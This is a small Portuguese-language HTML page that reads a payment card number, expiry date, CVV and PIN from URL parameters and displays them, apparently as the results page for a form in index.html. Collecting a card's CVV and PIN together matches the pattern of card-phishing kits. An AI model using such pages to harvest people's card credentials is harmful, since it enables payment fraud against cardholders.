<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dados Recebidos</title>
    <!-- Tailwind CSS CDN para um design simples e objetivo -->
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        /* Estilos personalizados para o corpo e contêiner */
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f0f2f5; /* Fundo cinza claro */
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            max-width: 500px;
            width: 95%;
            background-color: #ffffff;
            border-radius: 1rem; /* Cantos arredondados */
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            padding: 2rem;
            text-align: center;
        }
        .data-item {
            background-color: #f9fafb; /* Fundo leve para cada item */
            border: 1px solid #e5e7eb; /* Borda sutil */
            border-radius: 0.75rem;
            padding: 1rem 1.5rem;
            margin-bottom: 1rem;
            text-align: left;
        }
        .data-label {
            font-weight: 600;
            color: #4b5563; /* Texto cinza escuro para o label */
            margin-bottom: 0.25rem;
            display: block;
        }
        .data-value {
            font-size: 1.125rem;
            color: #1f2937; /* Texto mais escuro para o valor */
            word-wrap: break-word; /* Quebra de linha para valores longos */
        }
        .no-data-message {
            color: #ef4444; /* Vermelho para mensagem de erro */
            font-style: italic;
        }
        .general-no-data {
            background-color: #fee2e2; /* Fundo vermelho claro */
            color: #ef4444; /* Texto vermelho escuro */
            padding: 1rem;
            border: 1px solid #fca5a5; /* Borda vermelha */
            border-radius: 0.75rem;
            margin-top: 1.5rem;
            font-weight: 500;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="text-2xl font-bold text-gray-800 mb-6">Dados Recebidos</h1>

        <div id="dataDisplay">
            <!-- Os dados serão inseridos aqui pelo JavaScript -->
        </div>

        <script>
            // Função para obter parâmetros da URL
            function getUrlParameter(name) {
                name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
                const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
                const results = regex.exec(location.search);
                return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
            }

            // Elemento onde os dados serão exibidos
            const dataDisplay = document.getElementById('dataDisplay');
            let hasData = false;

            // Define os campos esperados e seus rótulos
            const fields = {
                'cartao': 'Cartão',
                'validade': 'Validade',
                'cvv': 'CVV',
                'pin': 'Senha/PIN'
            };

            // Itera sobre os campos e exibe-os
            for (const key in fields) {
                if (fields.hasOwnProperty(key)) {
                    const value = getUrlParameter(key);
                    const label = fields[key];

                    const dataItem = document.createElement('div');
                    dataItem.className = 'data-item';

                    const dataLabel = document.createElement('span');
                    dataLabel.className = 'data-label';
                    dataLabel.textContent = label + ':';
                    dataItem.appendChild(dataLabel);

                    const dataValue = document.createElement('span');
                    dataValue.className = 'data-value';

                    if (value) {
                        dataValue.textContent = value;
                        hasData = true;
                    } else {
                        dataValue.textContent = 'Nenhum dado enviado!';
                        dataValue.classList.add('no-data-message');
                    }
                    dataItem.appendChild(dataValue);
                    dataDisplay.appendChild(dataItem);
                }
            }

            // Se nenhum dado foi encontrado na URL, exibe uma mensagem geral
            if (!hasData) {
                dataDisplay.innerHTML = `
                    <div class="general-no-data">
                        Nenhum dado foi enviado na URL. Por favor, preencha o formulário em index.html.
                    </div>
                `;
            }
        </script>
    </div>
</body>
</html>
